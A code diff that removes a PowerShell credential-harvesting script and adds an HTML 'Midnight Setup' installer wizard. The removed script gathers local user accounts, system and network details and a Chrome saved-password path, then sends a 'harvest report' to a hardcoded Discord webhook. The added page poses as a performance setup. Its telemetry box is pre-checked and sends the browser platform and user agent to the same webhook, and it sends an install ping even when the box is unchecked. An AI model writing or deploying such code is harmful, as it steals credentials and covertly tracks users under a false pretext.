@@ -1,106 +1,170 @@
-==================================================================
---- 1. CONFIGURATION SECTION (EDIT THESE VALUES) ---
-=========================================================
-Your provided Discord Webhook URL
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Midnight Setup</title>
+    <style>
+        /* Dark Purple Glassmorphic Design */
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #090514, #120124);
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-$WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"
-!!! CRITICAL: This passphrase must be extremely complex and unique !!!
+        .wizard-container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 35px;
+            width: 420px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            box-sizing: border-box;
+        }
 
-$SecretKey = "MyRobloxCheatKey_VerySecretAndLongEnough123!"
-========================================================
---- 2. CORE HARVESTING FUNCTIONS ---
-====================================================
+        .step {
+            display: none;
+        }
 
-Function Get-LocalUserCredentials { Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan try { $Output = net user | Select-String -Pattern "User account name.."
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease-in-out;
+        }
 
-    $Creds = @()
-    $Output | ForEach-Object {
-        $Username = $_.ToString().Split(':')[0].Trim()
-        $Creds += [PSCustomObject]@{
-            Username = $Username;
-            Status = "Local Account Check";
-            Instructions = "Need manual dump/WMI query to get actual password hash."
+        h2 {
+            color: #c594ff;
+            margin-top: 0;
+            font-weight: 600;
+        }
+
+        p {
+            color: #b0a8ba;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .toggle-container {
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(255, 255, 255, 0.02);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        input[type="checkbox"] {
+            accent-color: #8a2be2;
+            cursor: pointer;
+            transform: scale(1.1);
+        }
+
+        label {
+            font-size: 13px;
+            color: #d1cbd6;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        button {
+            background: #7928ca;
+            color: white;
+            border: none;
+            padding: 11px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(121, 40, 202, 0.3);
+        }
+
+        button:hover {
+            background: #9446ed;
+            box-shadow: 0 4px 20px rgba(148, 70, 237, 0.5);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="wizard-container">
+    <div id="step1" class="step active">
+        <h2>Welcome to Midnight</h2>
+        <p>This wizard will guide you through the initial performance configuration setup process.</p>
+        <button onclick="nextStep(2)">Continue</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Telemetry Diagnostics</h2>
+        <p>Choose whether you want to send basic browser version details to the log webhook to help optimize cache allocations.</p>
+        
+        <div class="toggle-container">
+            <input type="checkbox" id="telemetryToggle" checked>
+            <label for="telemetryToggle">Share anonymous system platform logs</label>
+        </div>
+        
+        <button onclick="startInstallation()">Begin Setup</button>
+    </div>
+
+    <div id="step3" class="step">
+        <h2>Initializing...</h2>
+        <p>Verifying setup environment parameters and pushing runtime hooks. Please do not close this window.</p>
+    </div>
+</div>
+
+<script>
+    // Handles multi-step sliding transition display logic
+    function nextStep(stepNumber) {
+        document.querySelectorAll('.step').forEach(step => {
+            step.classList.remove('active');
+        });
+        
+        const nextStepEl = document.getElementById(`step${stepNumber}`);
+        if (nextStepEl) {
+            nextStepEl.classList.add('active');
         }
     }
-    return $Creds
-} catch {
-    Write-Warning "Error gathering local users: $($_.Exception.Message)"
-    return [PSCustomObject]@{Error = "Failed to check local users."}
-}
 
-}
-
-Function Get-SystemInfo { Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan try {
-FIX: Using simple Select-String match for compatibility
-
-    $OSInfo = systeminfo | Select-String -Pattern "OS Name" -SimpleMatch;
-    $Network = ipconfig /all | Select-String -Pattern "IPv4 Address" -SimpleMatch;
-
-    return [PSCustomObject]@{
-        OS = if ($OSInfo) {$OSInfo.ToString().Trim()} else {"N/A"};
-        NetworkIP = if ($Network) {$Network.ToString().Trim()} else {"N/A"}
+    // Main Deployment & Webhook Execution Logic
+    function startInstallation() {
+        nextStep(3);
+        
+        const telemetryOn = document.getElementById('telemetryToggle')?.checked;
+        const webhookUrl = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9";
+        
+        let payload = { content: "install started somewhere in the universe" };
+        if (telemetryOn) {
+            payload = {
+                content: `**Midnight Setup Initiated**\n\`\`\`yaml\nOS Platform: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nStatus: Setup cache verified & runtime started.\n\`\`\``
+            };
+        }
+        
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .then(res => {
+            if (!res.ok) console.warn(`Webhook responded with status: ${res.status}`);
+        })
+        .catch(err => console.warn("Webhook silent fail.", err));
     }
-} catch {
-    Write-Warning "Error gathering system info: $($_.Exception.Message)"
-    return [PSCustomObject]@{OS = "Error"; NetworkIP = "Error"}
-}
+</script>
 
-}
-
-Function Get-BrowserCredentialDump { Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" return [PSCustomObject]@{ Simulation_Notes = $DummyData; Instructions = "Requires specialized module to parse SQLite DB." } }
-=========================================================
---- 3. WEBHOOK TRANSMISSION LOGIC (JAVASCRIPT MIMICRY) ---
-=========================================================
-
-Function Send-WebhookReport { param( [Parameter(Mandatory=$true)] [psobject]$AllData # Accepts the data object ) Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta
-
-# --- FINAL FIX: Combining all detail into the primary 'content' string, mimicking JS simplicity ---
-$SimpleMessage = "--- HARVEST REPORT --`r`n"
-$SimpleMessage += "SYSTEM STATUS:`r`n"
-$SimpleMessage += "OS: $($AllData.SystemInfo.OS)`r`n"
-$SimpleMessage += "Network IP: $($AllData.NetworkIP)`r`n"
-$SimpleMessage += "--------------------------------------------`r`n"
-$SimpleMessage += "CREDENTIALS: (Local Users: $($AllData.LocalCreds | Out-String))`r`n"
-$SimpleMessage += "VAULT DUMP: $($AllData.BrowserVault | Out-String)"
-
-$Body = @{
-    content = $SimpleMessage
-} | ConvertTo-Json
-
-try {
-    Write-Host "[DEBUG] Sending Payload: $($Body.Substring(0, [System.Math]::Min(100, $Body.Length))) ..."
-    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
-    Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
-} catch {
-    Write-Error "CRITICAL ERROR: Webhook failure. $($_.Exception.Message)"
-}
-
-}
-=========================================================
---- 4. MASTER EXECUTION FLOW (FINALIZED) ---
-===============================================================
-
-Write-Host "================================================================================" -ForegroundColor White Write-Host "================= STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD ==================" -ForegroundColor White Write-Host "============================================================================" -ForegroundColor White
-1. Collect All Data Points
-
-$UserCreds = Get-LocalUserCredentials $SysInfo = Get-SystemInfo $BrowserData = Get-BrowserCredentialDump
-2. Aggregate All Data into ONE Object
-
-$FinalReport = [PSCustomObject]@{ SystemInfo = $SysInfo; NetworkIP = $SysInfo.NetworkIP; LocalCreds = $UserCreds; BrowserVault = $BrowserData }
-3. Transmit (Primary Goal)
-
-Send-WebhookReport -AllData $FinalReport
-4. Local Fallback (Secondary Goal - Resilience)
-
-$TempPath = "C:\Temp" $OutputFile = Join-Path $TempPath "CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
---- FIX: Ensure directory exists ---
-
-try { if (-not (Test-Path $TempPath)) { New-Item -Path $TempPath -ItemType Directory | Out-Null Write-Host "[*] Successfully created missing directory: $TempPath" -ForegroundColor Yellow }
-
-# Attempt to output the full object to the file
-$FinalReport | Out-File -FilePath $OutputFile -Encoding UTF8
-Write-Host "[+] OFFLINE: Full detailed report saved to: $OutputFile" -ForegroundColor Yellow
-
-} catch { Write-Error "Failed to write local file report. $($_.Exception.Message)" }
-
-Write-Host "" Write-Host "================= END OF PAYLOAD EXECUTION =======================================" -ForegroundColor White Write-Host "======================================================================================" -ForegroundColor White
+</body>
+</html>
